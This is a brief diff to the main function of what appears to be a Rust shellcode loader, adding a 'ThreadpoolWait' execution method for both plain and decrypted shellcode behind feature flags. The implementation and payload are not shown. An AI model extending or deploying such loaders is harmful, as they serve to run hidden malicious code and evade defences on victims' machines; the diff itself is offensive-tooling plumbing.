@@ -232,6 +232,9 @@ fn main() {
 
         #[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
         execution::shellcode_execute_enumsystemgeoid(shellcode.clone());
+
+        #[cfg(feature = "ShellcodeExecuteThreadpoolWait")]
+        execution::shellcode_execute_threadpoolwait(shellcode.clone());
     }
 
     // =======================================================================
@@ -363,6 +366,9 @@ fn main() {
 
             #[cfg(feature = "ShellcodeExecuteEnumSystemGeoID")]
             execution::shellcode_execute_enumsystemgeoid(decrypted_shellcode.clone());
+
+            #[cfg(feature = "ShellcodeExecuteThreadpoolWait")]
+            execution::shellcode_execute_threadpoolwait(decrypted_shellcode.clone());
         }
     }
 }
